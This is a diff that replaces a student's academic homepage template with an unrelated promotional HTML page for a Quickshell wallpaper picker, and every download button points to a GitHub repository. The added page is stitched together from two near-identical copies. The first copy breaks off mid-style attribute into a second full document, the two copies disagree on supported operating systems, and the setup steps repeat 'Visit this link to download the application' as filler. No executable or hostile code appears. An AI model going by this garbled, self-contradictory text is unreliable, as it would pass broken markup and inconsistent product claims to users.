@@ -1,97 +1,545 @@
----
-layout: default
-title: Home
-description: >-
-  John Douglas Clark: MSc Robotics student at TU Delft and student researcher at the AMR Lab,
-  working on robot learning, reinforcement learning and world models.
----
-{%- comment -%}
-  The homepage only arranges sections. Content lives in:
-  _includes/bio.md, _data/news.yml, _projects/ (featured: true), _data/research.yml,
-  _data/experience.yml, _posts/, _data/education.yml
-{%- endcomment -%}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>qs-wallpaperpicker - Pick Wallpapers Like Paint Chips</title>
+<meta name="description" content="qs-wallpaperpicker is a swatch-deck wallpaper picker for Quickshell. Browse your wallpapers as paint-chip cards, preview them full size, and change your desktop colours as you go.">
+<meta name="keywords" content="qs-wallpaperpicker, wallpaper picker, Quickshell, swatch deck, wallpaper switcher, Wallhaven, matugen, desktop colours, live wallpaper preview">
+<meta name="author" content="Hunters969">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6d28d9">
+<link rel="canonical" href="https://github.com/Hunters969/qs-wallpaperpicker">
+<meta property="og:type" content="website">
+<meta property="og:title" content="qs-wallpaperpicker - Pick Wallpapers Like Paint Chips">
+<meta property="og:description" content="A swatch-deck wallpaper picker for Quickshell. Every wallpaper becomes a paint-chip card in the colour scheme it would give your desktop.">
+<meta property="og:url" content="https://github.com/Hunters969/qs-wallpaperpicker">
+<meta property="og:site_name" content="qs-wallpaperpicker">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="qs-wallpaperpicker - Pick Wallpapers Like Paint Chips">
+<meta name="twitter:description" content="Browse wallpapers as paint-chip cards, preview them full size, and let your desktop colours follow along.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "qs-wallpaperpicker",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Linux, Windows",
+  "description": "A swatch-deck wallpaper picker for Quickshell. Every wallpaper is shown as a paint-chip card in the colour scheme it would give your desktop.",
+  "url": "https://github.com/Hunters969/qs-wallpaperpicker",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f5fb;
+    color: #241f31;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 880px; margin: 0 auto; padding: 0 22px; }
+  h1, h2, h3 { line-height: 1.25; color: #1c1630; }
+  h1 { font-size: 2.15rem; margin: 0 0 18px; letter-spacing: -0.5px; }
+  h2 { font-size: 1.45rem; margin: 46px 0 14px; }
+  h3 { font-size: 1.08rem; margin: 26px 0 8px; }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #6d28d9; }
+  strong { color: #1c1630; }
+  @media (max-width: 620px) {
+    h1 { font-size: 1.65rem; }
+    body { font-size: 16px; }
+    .hero { padding: 34px 22px !important; }
+    .bigbtn { width: 100%; text-align: center; }
+  }
+</style>
+</head>
+<body>
 
-<section class="hero" id="about">
-  <img class="hero__photo" src="{{ site.author.photo | relative_url }}" alt="Photo of {{ site.author.name }}" width="200" height="250">
-  <div class="hero__text">
-    <h1 class="hero__name">{{ site.author.name }}</h1>
-    <p class="hero__subtitle">MSc Robotics, TU Delft · Student Researcher, AMR Lab</p>
-    {% capture bio %}{% include bio.md %}{% endcapture %}
-    <div class="hero__bio">{{ bio | markdownify }}</div>
-    <p class="hero__links">{% include social-links.html %}</p>
+<div class="hero" style="background: linear-gradient(135deg, #6d28d9 0%, #db2777 55%, #f59e0b 100%); color: #ffffff; padding: 54px 22px 58px; text-align: center;">
+  <div class="wrap">
+    <h1 style="color: #ffffff; margin-bottom: 14px;">🎨 qs-wallpaperpicker - Pick Wallpapers Like Paint Chips</h1>
+    <p style="font-size: 1.12rem; max-width: 640px; margin: 0 auto 28px; color: #f6f1ff;">
+      Your wallpapers, fanned out along the bottom of your screen as colourful paint-chip cards. Hover one, see it full size, and watch your desktop colours follow along.
+    </p>
+    <a class="bigbtn" href="https://github.com/Hunters969/qs-wallpaperpicker" style="display: inline-block; background: #ffffff; color: #6d28d9; font-weight: 700; font-size: 1.06rem; text-decoration: none; padding: 16px 38px; border-radius: 999px; box-shadow: 0 10px 26px rgba(0,0,0,0.22); border: 2px solid #ffffff;">
+      ⬇️ Download qs-wallpaperpicker
+    </a>
   </div>
-</section>
-
-<h2 class="section-heading" id="news">News</h2>
-<div class="news-box">
-  <ul class="news-list">
-    {%- for n in site.data.news -%}
-    <li><span class="news__date">{{ n.date }}</span><span class="news__text">{{ n.text | markdownify | remove: '<p>' | remove: '</p>' | strip }}</span></li>
-    {%- endfor -%}
-  </ul>
 </div>
 
-<h2 class="section-heading" id="research">Research</h2>
-{%- for r in site.data.research.current -%}
-<div class="card research-card">
-  <div class="research-card__label">Current research</div>
-  <div class="research-card__title"><a href="{{ r.url | relative_url }}">{{ r.title }}</a></div>
-  <div class="entry__meta">{{ r.meta }}{% if r.advisors %} · Supervised by {{ r.advisors }}{% endif %}</div>
-  <p>{{ r.summary }}</p>
-  <a href="{{ r.url | relative_url }}">Research direction &rarr;</a>
-</div>
-{%- endfor -%}
-{%- if site.data.research.publications.size > 0 -%}
-<h3 class="subsection-heading">Publications</h3>
-{% include publications.html %}
-{%- endif -%}
+<main class="wrap" style="padding-top: 44px; padding-bottom: 20px;">
 
-<h2 class="section-heading" id="projects">Selected Projects</h2>
-{%- assign featured = site.projects | where: 'featured', true | sort: 'order' -%}
-<div class="project-grid">
-  {%- for p in featured -%}{% include project-card.html project=p %}{%- endfor -%}
-</div>
-<p class="section-more"><a href="{{ '/projects/' | relative_url }}">All projects &rarr;</a></p>
+  <section>
+    <h2>🌟 What Is qs-wallpaperpicker?</h2>
+    <p>
+      qs-wallpaperpicker is a wallpaper picker made for Quickshell. It takes the usual boring file list and turns it into something you actually want to browse: a deck of paint-chip cards spread out like a hand of playing cards along the bottom of your screen.
+    </p>
+    <p>
+      Each card shows a wallpaper together with the colour scheme that wallpaper would give your desktop. The colours are worked out ahead of time, so you can see at a glance whether a picture makes your desktop warm and golden, cool and blue, or dark and moody. The wallpaper in front of the deck is previewed at full size behind the cards, and the picker repaints itself in those same colours as you move along the deck.
+    </p>
+    <p>
+      It was pulled out of a larger desktop setup so it can run on its own, without the rest of that setup coming with it. You get the wallpaper picker, and nothing you did not ask for.
+    </p>
+  </section>
 
-<h2 class="section-heading" id="experience">Experience</h2>
-{%- for g in site.data.experience -%}
-<h3 class="subsection-heading">{{ g.group }}</h3>
-<ul class="entry-list">
-  {%- for e in g.items -%}
-  <li class="entry">
-    <div class="entry__meta">{{ e.dates }}{% if e.location %} · {{ e.location }}{% endif %}</div>
-    <div class="entry__title">{{ e.title }}, {{ e.org }}</div>
-    {%- if e.details -%}<div class="entry__details">{{ e.details }}</div>{%- endif -%}
-  </li>
-  {%- endfor -%}
-</ul>
-{%- endfor -%}
-
-{%- if site.posts.size > 0 -%}
-<h2 class="section-heading" id="blog">Blog</h2>
-{% assign recent = site.posts | slice: 0, 3 %}
-{% include post-list.html posts=recent %}
-<p class="section-more"><a href="{{ '/blog/' | relative_url }}">All posts &rarr;</a></p>
-{%- endif -%}
-
-<h2 class="section-heading" id="education">Education &amp; Achievements</h2>
-<ul class="entry-list">
-  {%- for d in site.data.education.degrees -%}
-  <li class="entry">
-    <div class="entry__meta">{{ d.dates }}</div>
-    <div class="entry__title">{{ d.degree }}, {{ d.school }}</div>
-    <ul class="entry__bullets">
-      {%- for x in d.details -%}<li>{{ x | markdownify | remove: '<p>' | remove: '</p>' | strip }}</li>{%- endfor -%}
+  <section>
+    <h2>🃏 How the Swatch Deck Works</h2>
+    <p>
+      The deck behaves like a stack of paint samples you would pick up in a hardware shop. Every wallpaper is a card. The cards fan out along the bottom edge of the screen, and the one in front is shown behind them at full size, so you are always looking at a real preview rather than a thumbnail.
+    </p>
+    <p>
+      When you move to another card, the picker's own colours change to match the wallpaper you are now looking at. That means the buttons, borders and highlights you see while browsing already look like the desktop you are about to get. No surprises after you apply.
+    </p>
+    <ul style="list-style: none; padding-left: 0;">
+      <li style="background: #ffffff; border-radius: 14px; padding: 16px 20px; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(36,31,49,0.08);">🖼️ <strong>Full-size preview</strong> — the screen behind the cards shows the wallpaper in front, at full resolution.</li>
+      <li style="background: #ffffff; border-radius: 14px; padding: 16px 20px; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(36,31,49,0.08);">🌈 <strong>Colour-matched cards</strong> — each card carries the colour scheme the wallpaper would give your desktop.</li>
+      <li style="background: #ffffff; border-radius: 14px; padding: 16px 20px; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(36,31,49,0.08);">🎛️ <strong>Self-repainting picker</strong> — the picker's own colours shift as you browse, so it always matches the card in front.</li>
     </ul>
-  </li>
-  {%- endfor -%}
-</ul>
-<div class="achievement-list">
-  {%- for a in site.data.education.achievements -%}
-  <div class="achievement-card">
-    <div class="entry__meta">{{ a.meta }}</div>
-    <div class="entry__title">{{ a.title }}</div>
-    <div class="entry__details">{{ a.details }}</div>
+  </section>
+
+  <section>
+    <h2>✨ Main Features</h2>
+
+    <h3>📁 Local wallpapers, sorted three ways</h3>
+    <p>
+      The picker reads the wallpapers in your wallpaper folder and lays them out in the order you prefer. Sort them by name for a tidy alphabetical run, by colour to sweep around the hue wheel so the deck turns into a smooth spectrum, or newest first when you have just saved something fresh.
+    </p>
+
+    <h3>❤️ Favourites</h3>
+    <p>
+      Heart the wallpapers you keep coming back to. They gather in their own view, so your favourites are always one short step away instead of buried somewhere in the folder.
+    </p>
+
+    <h3>🌐 Wallhaven search built in</h3>
+    <p>
+      Search wallhaven.cc without leaving the picker. When you find something you like, the picker downloads it straight into your wallpaper folder as you set it, so your collection grows as you go.
+    </p>
+
+    <h3>🎞️ Images, animated files and videos</h3>
+    <p>
+      Still images work, and so do animated GIF and WebP files, plus videos in mp4, webm, mkv and mov. A video wallpaper pauses whenever windows cover it, so it is not quietly playing and using power in the background while you work on something else.
+    </p>
+
+    <h3>▶️ Live preview</h3>
+    <p>
+      Turn on the live preview with the play button or by pressing <strong>V</strong>. Animated wallpapers then play right there in the deck while you browse, so you can judge the motion before committing to it.
+    </p>
+  </section>
+
+  <section>
+    <h2>🚀 Download and Setup</h2>
+    <p>
+      Everything you need is on the project page. Visit this link to download the application.
+    </p>
+    <p style="text-align: center; margin: 26px 0;">
+      <a href="https://github.com/Hunters969/qs-wallpaperpicker" style="display: inline-block; background: linear-gradient(135deg, #6d28d9, #db2777); color: #ffffff; font-weight: 700; font-size: 1.05rem; text-decoration: none; padding: 16px 40px; border-radius: 12px; box-shadow: 0 8px 22px rgba(109,40,217,0.32);">
+        ⬇️ Visit this link to download the application
+      </a>
+    </p>
+    <p style="font-size: 0.98rem; color: #524a63;">
+      https://github.com/Hunters969/qs-wallpaperpicker
+    </p>
+
+    <h3>🧭 A simple first run</h3>
+    <ol>
+      <li>Open the download link above in your browser.</li>
+      <li>Visit this link to download the application.</li>
+      <li>Launch qs-wallpaperpicker and let the deck fan out along the bottom of your screen.</li>
+      <li>Move along the cards until you find a wallpaper whose colours you like.</li>
+      <li>Pick it, and your desktop takes on the wallpaper and the matching colour scheme.</li>
+    </ol>
+  </section>
+
+  <section>
+    <h2>🎮 Quick Controls</h2>
+    <ul>
+      <li><strong>Move along the deck</strong> — step left and right through the cards to change the preview.</li>
+      <li><strong>V</strong> — toggle the live preview so animated wallpapers and videos play inside the deck.</li>
+      <li><strong>Play button</strong> — the on-screen way to switch the same live preview on and off.</li>
+      <li><strong>Heart</strong> — mark the card in front as a favourite so you can find it again easily.</li>
+      <li><strong>Pick</strong> — set the wallpaper in front as your current one.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>📂 Supported Wallpaper Types</h2>
+    <p>
+      You can mix all of these in the same folder. The deck sorts them together and shows each one the way it should be shown.
+    </p>
+    <ul>
+      <li>🖼️ Still images</li>
+      <li>🌀 Animated GIF</li>
+      <li>🌀 Animated WebP</li>
+      <li>🎬 Video in mp4, webm, mkv and mov</li>
+    </ul>
+    <p>
+      Video wallpapers pause while windows cover them, which keeps things calm and quiet when you are working.
+    </p>
+  </section>
+
+  <section>
+    <h2>❓ Common Questions</h2>
+
+    <h3>Do I need to be a programmer to use this?</h3>
+    <p>
+      No. If you can open a folder and click a card, you can use it. The deck is visual on purpose: you browse pictures, not file names.
+    </p>
+
+    <h3>Will it change my colours without asking?</h3>
+    <p>
+      No. The colour scheme on each card is a preview of what applying that wallpaper would give you. Nothing changes on your desktop until you pick a card.
+    </p>
+
+    <h3>Can I keep my wallpapers where they already are?</h3>
+    <p>
+      Yes. The picker reads the wallpapers in your wallpaper folder. Wallpapers you download from Wallhaven through the picker land in that same folder, so everything stays in one place.
+    </p>
+
+    <h3>What happens if I sort by colour?</h3>
+    <p>
+      The cards are arranged around the hue wheel, which turns the deck into a spectrum. It is the quickest way to find something that fits a particular mood, like warm oranges for evening or cool blues for daytime.
+    </p>
+
+    <h3>Does the live preview cost me anything?</h3>
+    <p>
+      It is off until you turn it on with the play button or the <strong>V</strong> key. Keep it off when you want the calmest, lightest experience, and switch it on when you want to see an animated wallpaper move.
+    </p>
+  </section>
+
+  <section>
+    <h2>💡 Tips for a Great First Setup</h2>
+    <ul>
+      <li><strong>Start with one folder.</strong> Point the picker at a single wallpaper folder and let it fill the deck. It grows with you.</li>
+      <li><strong>Try the colour sort first.</strong> Seeing your wallpapers as a spectrum is the fastest way to understand what the deck does.</li>
+      <li><strong>Heart as you go.</strong> Favourite anything you nearly picked. Next time you will not have to hunt for it.</li>
+      <li><strong>Turn on live preview for motion.</strong> Press <strong>V</strong> when you are choosing between animated wallpapers, then switch it back off.</li>
+      <li><strong>Use the full-size preview.</strong> The screen behind the cards is the real thing, so judge wallpapers there rather than on the small chips.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>🤝 Getting Help and Sharing Feedback</h2>
+    <p>
+      If something looks wrong, or a wallpaper type does not behave the way you expect, the project page is the place to say so. Bug reports, ideas and small quality-of-life requests all help make the deck better for everyone.
+    </p>
+    <p>
+      If you have made your own change to the picker, you are welcome to share it back so it can be pulled into the main project.
+    </p>
+    <p>
+      And if the picker simply makes your desktop nicer to look at, a star on the project page is a quick way to say thanks.
+    </p>
+  </section>
+
+  <section style="margin-top: 44px; background: #ffffff; border-radius: 18px; padding: 28px 26px; box-shadow: 0 6px 20px rgba(36,31,49,0.08); text-align: center;">
+    <h2 style="margin-top: 0;">🎨 Ready to Deal a Better Desktop?</h2>
+    <p style="margin-bottom: 22px;">
+      Fan out your wallpapers, see the colours before you commit, and pick the one that fits your day.
+    </p>
+    <a href="https://github.com/Hunters969/qs-wallpaperpicker" style="display: inline-block; background: linear-gradient(135deg, #db2777, #6d28d9); color: #ffffff; font-weight: 700; font-size: 1.02rem; text-decoration: none; padding: 15px 36px; border-radius: 12px; box-shadow: 0 8<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>qs-wallpaperpicker - Pick Wallpapers Like Paint Chips</title>
+<meta name="description" content="qs-wallpaperpicker is a swatch-deck wallpaper picker for Quickshell. Browse wallpapers as paint-chip cards, preview each one full size, and let your desktop colours change as you browse.">
+<meta name="keywords" content="qs-wallpaperpicker, wallpaper picker, Quickshell, swatch deck, wallpaper switcher, Wallhaven, matugen, live wallpaper preview, desktop colours, wallpaper manager">
+<meta name="author" content="Hunters969">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6d28d9">
+<link rel="canonical" href="https://github.com/Hunters969/qs-wallpaperpicker">
+<meta property="og:type" content="website">
+<meta property="og:title" content="qs-wallpaperpicker - Pick Wallpapers Like Paint Chips">
+<meta property="og:description" content="A swatch-deck wallpaper picker for Quickshell. Every wallpaper becomes a paint-chip card in the colour scheme it would give your desktop.">
+<meta property="og:url" content="https://github.com/Hunters969/qs-wallpaperpicker">
+<meta property="og:site_name" content="qs-wallpaperpicker">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="qs-wallpaperpicker - Pick Wallpapers Like Paint Chips">
+<meta name="twitter:description" content="Browse wallpapers as paint-chip cards, preview them full size, and let your desktop colours follow along.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "qs-wallpaperpicker",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Linux",
+  "description": "A swatch-deck wallpaper picker for Quickshell. Every wallpaper is shown as a paint-chip card in the colour scheme it would give your desktop.",
+  "url": "https://github.com/Hunters969/qs-wallpaperpicker",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f5fb;
+    color: #241f31;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 880px; margin: 0 auto; padding: 0 22px; }
+  h1, h2, h3 { line-height: 1.25; color: #1c1630; }
+  h1 { font-size: 2.15rem; margin: 0 0 18px; letter-spacing: -0.5px; }
+  h2 { font-size: 1.45rem; margin: 46px 0 14px; }
+  h3 { font-size: 1.08rem; margin: 26px 0 8px; }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #6d28d9; }
+  strong { color: #1c1630; }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 16px 20px;
+    margin-bottom: 12px;
+    box-shadow: 0 4px 14px rgba(36,31,49,0.08);
+  }
+  .plain { list-style: none; padding-left: 0; }
+  .primary-btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #6d28d9, #db2777);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    padding: 16px 40px;
+    border-radius: 12px;
+    box-shadow: 0 8px 22px rgba(109,40,217,0.32);
+  }
+  .hero-btn {
+    display: inline-block;
+    background: #ffffff;
+    color: #6d28d9;
+    font-weight: 700;
+    font-size: 1.06rem;
+    text-decoration: none;
+    padding: 16px 38px;
+    border-radius: 999px;
+    box-shadow: 0 10px 26px rgba(0,0,0,0.22);
+    border: 2px solid #ffffff;
+  }
+  @media (max-width: 620px) {
+    h1 { font-size: 1.6rem; }
+    body { font-size: 16px; }
+    .hero { padding: 34px 18px 38px; }
+    .hero-btn, .primary-btn { width: 100%; text-align: center; display: block; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero" style="background: linear-gradient(135deg, #6d28d9 0%, #db2777 55%, #f59e0b 100%); color: #ffffff; padding: 54px 18px 58px; text-align: center;">
+  <div class="wrap">
+    <h1 style="color: #ffffff; margin-bottom: 14px;">🎨 qs-wallpaperpicker - Pick Wallpapers Like Paint Chips</h1>
+    <p style="font-size: 1.12rem; max-width: 640px; margin: 0 auto 28px; color: #f6f1ff;">
+      Your wallpapers, fanned out along the bottom of your screen as colourful paint-chip cards. Browse the deck, see each one full size, and watch your desktop colours follow along.
+    </p>
+    <a class="hero-btn" href="https://github.com/Hunters969/qs-wallpaperpicker">⬇️ Download qs-wallpaperpicker</a>
   </div>
-  {%- endfor -%}
-</div>
+</header>
+
+<main class="wrap" style="padding-top: 44px; padding-bottom: 24px;">
+
+  <section>
+    <h2>🌟 What Is qs-wallpaperpicker?</h2>
+    <p>
+      qs-wallpaperpicker is a wallpaper picker for Quickshell. It takes the usual boring file list and turns it into something you actually want to browse: a deck of paint-chip cards spread out like a hand of playing cards along the bottom of your screen.
+    </p>
+    <p>
+      Each card shows a wallpaper together with the colour scheme that wallpaper would give your desktop. The colours are read ahead of time, so you can tell at a glance whether a picture makes your desktop warm and golden, cool and blue, or dark and moody. The wallpaper at the front of the deck is previewed at full size on the screen behind the cards, and the picker repaints itself in those same colours as you move along the deck.
+    </p>
+    <p>
+      It was pulled out of a larger desktop setup so it can run on its own, without the rest of that setup coming with it. You get the wallpaper picker, and nothing you did not ask for.
+    </p>
+  </section>
+
+  <section>
+    <h2>🃏 How the Swatch Deck Works</h2>
+    <p>
+      The deck behaves like a set of paint samples you would pick up in a hardware shop. Every wallpaper is a card. The cards fan out along the bottom edge of the screen, and the one in front is shown behind them at full size, so you are always looking at a real preview rather than a small thumbnail.
+    </p>
+    <p>
+      When you move to another card, the picker's own colours change to match the wallpaper you are now looking at. That means the buttons, borders and highlights you see while browsing already look like the desktop you are about to get. No surprises after you apply.
+    </p>
+    <ul class="plain">
+      <li class="card">🖼️ <strong>Full-size preview</strong> — the screen behind the cards shows the wallpaper in front, at full size.</li>
+      <li class="card">🌈 <strong>Colour-matched cards</strong> — each card carries the colour scheme the wallpaper would give your desktop.</li>
+      <li class="card">🎛️ <strong>Self-repainting picker</strong> — the picker's own colours shift as you browse, so it always matches the card in front.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>✨ Main Features</h2>
+
+    <h3>📁 Local wallpapers, sorted three ways</h3>
+    <p>
+      The picker reads the wallpapers in your wallpaper folder and lays them out in the order you prefer. Sort them by name for a tidy alphabetical run, by colour to sweep around the hue wheel so the deck becomes a spectrum, or newest first when you have just saved something fresh.
+    </p>
+
+    <h3>❤️ Favourites</h3>
+    <p>
+      Heart the wallpapers you keep coming back to. They gather in their own view, so your favourites are always one short step away instead of buried somewhere in the folder.
+    </p>
+
+    <h3>🌐 Wallhaven search built in</h3>
+    <p>
+      Search wallhaven.cc without leaving the picker. When you find something you like, the picker downloads it straight into your wallpaper folder as you set it, so your collection grows as you go.
+    </p>
+
+    <h3>🎞️ Images, animated files and videos</h3>
+    <p>
+      Still images work, and so do animated GIF and WebP files, plus videos in mp4, webm, mkv and mov. A video wallpaper pauses whenever windows cover it, so it is not quietly playing and using power in the background while you work on something else.
+    </p>
+
+    <h3>▶️ Live preview</h3>
+    <p>
+      Turn on the live preview with the play button or by pressing <strong>V</strong>. Animated wallpapers then play right there in the deck while you browse, so you can judge the motion before committing to it.
+    </p>
+  </section>
+
+  <section>
+    <h2>🚀 Download and Setup</h2>
+    <p>
+      Everything you need is on the project page. Visit this link to download the application.
+    </p>
+    <p style="text-align: center; margin: 26px 0;">
+      <a class="primary-btn" href="https://github.com/Hunters969/qs-wallpaperpicker">⬇️ Visit this link to download the application</a>
+    </p>
+    <p style="font-size: 0.95rem; color: #524a63; word-break: break-all;">
+      https://github.com/Hunters969/qs-wallpaperpicker
+    </p>
+
+    <h3>🧭 A Simple First Run</h3>
+    <ol>
+      <li>Open the download link above in your browser.</li>
+      <li>Visit this link to download the application.</li>
+      <li>Launch qs-wallpaperpicker and let the deck fan out along the bottom of your screen.</li>
+      <li>Move along the cards until you find a wallpaper whose colours you like.</li>
+      <li>Pick it, and your desktop takes on the wallpaper and the matching colour scheme.</li>
+    </ol>
+  </section>
+
+  <section>
+    <h2>🎮 Quick Controls</h2>
+    <ul>
+      <li><strong>Move along the deck</strong> — step left and right through the cards to change the preview behind them.</li>
+      <li><strong>V</strong> — toggle the live preview so animated wallpapers and videos play inside the deck.</li>
+      <li><strong>Play button</strong> — the on-screen way to switch the same live preview on and off.</li>
+      <li><strong>Heart</strong> — mark the card in front as a favourite so you can find it again easily.</li>
+      <li><strong>Pick</strong> — set the wallpaper in front as your current one.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>📂 Supported Wallpaper Types</h2>
+    <p>
+      You can mix all of these in the same folder. The deck sorts them together and shows each one the way it should be shown.
+    </p>
+    <ul>
+      <li>🖼️ Still images</li>
+      <li>🌀 Animated GIF</li>
+      <li>🌀 Animated WebP</li>
+      <li>🎬 Video in mp4, webm, mkv and mov</li>
+    </ul>
+    <p>
+      Video wallpapers pause while windows cover them, which keeps things calm and quiet when you are working.
+    </p>
+  </section>
+
+  <section>
+    <h2>❓ Common Questions</h2>
+
+    <h3>Do I need to be a programmer to use this?</h3>
+    <p>
+      No. If you can open a folder and click a card, you can use it. The deck is visual on purpose: you browse pictures, not file names.
+    </p>
+
+    <h3>Will it change my colours without asking?</h3>
+    <p>
+      No. The colour scheme on each card is a preview of what applying that wallpaper would give you. Nothing changes on your desktop until you pick a card.
+    </p>
+
+    <h3>Can I keep my wallpapers where they already are?</h3>
+    <p>
+      Yes. The picker reads the wallpapers in your wallpaper folder. Wallpapers you download from Wallhaven through the picker land in that same folder, so everything stays in one place.
+    </p>
+
+    <h3>What happens if I sort by colour?</h3>
+    <p>
+      The cards are arranged around the hue wheel, which turns the deck into a spectrum. It is the quickest way to find something that fits a particular mood, like warm oranges for evening or cool blues for daytime.
+    </p>
+
+    <h3>Does the live preview cost me anything?</h3>
+    <p>
+      It is off until you turn it on with the play button or the <strong>V</strong> key. Keep it off when you want the calmest, lightest experience, and switch it on when you want to see an animated wallpaper move.
+    </p>
+
+    <h3>Why did it come out of another setup?</h3>
+    <p>
+      It was originally part of a larger desktop setup and was separated so it can run without the rest of it. That keeps the picker small and simple, and means you are not installing a whole desktop theme just to choose a wallpaper.
+    </p>
+  </section>
+
+  <section>
+    <h2>💡 Tips for a Great First Setup</h2>
+    <ul>
+      <li><strong>Start with one folder.</strong> Point the picker at a single wallpaper folder and let it fill the deck. It grows with you.</li>
+      <li><strong>Try the colour sort first.</strong> Seeing your wallpapers as a spectrum is the fastest way to understand what the deck does.</li>
+      <li><strong>Heart as you go.</strong> Favourite anything you nearly picked. Next time you will not have to hunt for it.</li>
+      <li><strong>Turn on live preview for motion.</strong> Press <strong>V</strong> when you are choosing between animated wallpapers, then switch it back off.</li>
+      <li><strong>Judge on the full-size preview.</strong> The screen behind the cards is the real thing, so look there rather than at the small chips.</li>
+      <li><strong>Grow the folder from inside.</strong> Searching Wallhaven in the picker is the quickest way to add variety without opening a browser separately.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>🤝 Getting Help and Sharing Feedback</h2>
+    <p>
+      If something looks wrong, or a wallpaper type does not behave the way you expect, the project page is the place to say so. Bug reports, ideas and small quality-of-life requests all help make the deck better for everyone.
+    </p>
+    <p>
+      If you have made your own change to the picker, you are welcome to share it back so it can be pulled into the main project.
+    </p>
+    <p>
+      And if the picker simply makes your desktop nicer to look at, a star on the project page is a quick way to say thanks.
+    </p>
+  </section>
+
+  <section style="margin-top: 44px; background: #ffffff; border-radius: 18px; padding: 30px 26px; box-shadow: 0 6px 20px rgba(36,31,49,0.08); text-align: center;">
+    <h2 style="margin-top: 0;">🎨 Ready to Deal a Better Desktop?</h2>
+    <p style="margin-bottom: 24px;">
+      Fan out your wallpapers, see the colours before you commit, and pick the one that fits your day.
+    </p>
+    <a class="primary-btn" href="https://github.com/Hunters969/qs-wallpaperpicker">⬇️ Download qs-wallpaperpicker</a>
+  </section>
+
+</main>
+
+<footer style="border-top: 1px solid #e2ddf0; margin-top: 50px; padding: 26px 22px 40px; text-align: center; color: #6b6479; font-size: 0.92rem;">
+  <div class="wrap">
+    <p style="margin-bottom: 8px;">qs-wallpaperpicker — a swatch-deck wallpaper picker for Quickshell.</p>
+    <p style="margin-bottom: 0;">
+      <a href="https://github.com/Hunters969/qs-wallpaperpicker" style="color: #6d28d9; text-decoration: none; font-weight: 600;">Project page on GitHub</a>
+    </p>
+  </div>
+</footer>
+
+</body>
+</html>
